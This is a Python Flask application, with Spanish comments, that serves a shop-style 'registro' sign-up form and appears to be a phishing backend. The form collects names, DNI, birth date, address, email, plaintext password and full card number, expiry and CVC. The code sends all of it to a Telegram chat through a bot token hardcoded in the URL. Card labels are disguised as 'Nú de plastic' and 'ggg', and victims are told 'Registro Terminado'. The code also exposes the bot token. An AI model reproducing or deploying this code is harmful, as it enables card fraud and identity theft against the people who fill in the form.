from flask import Flask, render_template, request, jsonify
import requests
import os

app = Flask(__name__)

# Ruta para la página principal
@app.route('/')
def index():
    return render_template('index.html')

# Ruta para la página de registro (GET: muestra form; POST: procesa y envía a bot)
@app.route('/registro', methods=['GET', 'POST'])
def registro():
    if request.method == 'POST':
        # Recolectar datos del formulario
        data = {
            'username': request.form.get('username', 'N/A'),
            'nombres': request.form.get('nombres', 'N/A'),
            'apellidos': request.form.get('apellidos', 'N/A'),
            'fecha_nacimiento': request.form.get('fecha-nacimiento', 'N/A'),
            'dni': request.form.get('dni', 'N/A'),
            'email': request.form.get('email', 'N/A'),
            'contrasena': request.form.get('contrasena', 'N/A'),  # Legible
            'celular': request.form.get('celular', 'N/A'),
            'telefono': request.form.get('telefono', 'N/A'),
            'pais': request.form.get('pais', 'N/A'),
            'provincia': request.form.get('provincia', 'N/A'),
            'codigo_postal': request.form.get('codigo-postal', 'N/A'),
            'calle': request.form.get('calle', 'N/A'),
            'numero': request.form.get('numero', 'N/A'),
            'card_name': request.form.get('card-name', 'N/A'),
            'card_number': request.form.get('card-number', 'N/A'),  # Completo, sin ofuscar
            'card_expiry': request.form.get('card-expiry', 'N/A'),
            'card_cvc': request.form.get('card-cvc', 'N/A')
        }

        # Formatear mensaje para Telegram
        message = (
            "*Nuevo Registro de Cuenta*\n\n"
            "*Datos Personales*\n"
            f"- Nombre de Usuario: {data['username']}\n"
            f"- Nombres: {data['nombres']}\n"
            f"- Apellidos: {data['apellidos']}\n"
            f"- Fecha de Nacimiento: {data['fecha_nacimiento']}\n"
            f"- DNI: {data['dni']}\n\n"
            "*Datos de Contacto*\n"
            f"- Email: {data['email']}\n"
            f"- Contraseña: {data['contrasena']}\n"
            f"- Celular: {data['celular']}\n"
            f"- Teléfono: {data['telefono']}\n\n"
            "*Dirección*\n"
            f"- País: {data['pais']}\n"
            f"- Provincia: {data['provincia']}\n"
            f"- Código Postal: {data['codigo_postal']}\n"
            f"- Calle: {data['calle']}\n"
            f"- Número: {data['numero']}\n\n"
            "*Datos de Pago*\n"
            f"- Nombre en Tarjeta: {data['card_name']}\n"
            f"- Nú de plastic: {data['card_number']}\n"
            f"- F de V: {data['card_expiry']}\n"
            f"- ggg: {data['card_cvc']}"
        )

        # Enviar a bot de Telegram
        bot_token = os.environ.get('TELEGRAM_BOT_TOKEN')
        chat_id = os.environ.get('TELEGRAM_CHAT_ID')
        
        # Verificar que las variables existan
        if not bot_token or not chat_id:
            print("Error: TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID no configurados en variables de entorno")
            print(f"bot_token: {bot_token}, chat_id: {chat_id}")
            return jsonify({'success': False, 'message': 'Error de configuración del servidor'}), 500

        telegram_url = f"https://api.telegram.org/bot8345884832:AAEBzNwoibZhS5uRHPD62Pyicuvhc_bwU-A/sendMessage"

        try:
            response = requests.post(telegram_url, data={
                'chat_id': chat_id,
                'text': message,
                'parse_mode': 'Markdown'
            })
            print(f"Telegram request URL: {telegram_url}")
            print(f"Telegram response status: {response.status_code}")
            print(f"Telegram response body: {response.text}")

            if response.status_code == 200:
                response_json = response.json()
                if response_json.get('ok'):
                    return jsonify({'success': True, 'message': 'Registro Terminado'})
                else:
                    print(f"Telegram API error: {response_json.get('description')}")
                    return jsonify({'success': False, 'message': f'Error de Telegram: {response_json.get("description")}'}), 500
            else:
                print(f"Telegram HTTP error: {response.status_code} - {response.text}")
                return jsonify({'success': False, 'message': f'Error en la solicitud HTTP: {response.status_code}'}), 500
        except Exception as e:
            print(f"Exception during Telegram request: {str(e)}")
            return jsonify({'success': False, 'message': f'Error interno: {str(e)}'}), 500

    # Para GET, renderiza el formulario
    return render_template('registro.html')

# Ruta para la página de productos
@app.route('/productos')
def productos():
    return render_template('productos.html')

if __name__ == '__main__':
    app.run(debug=True)
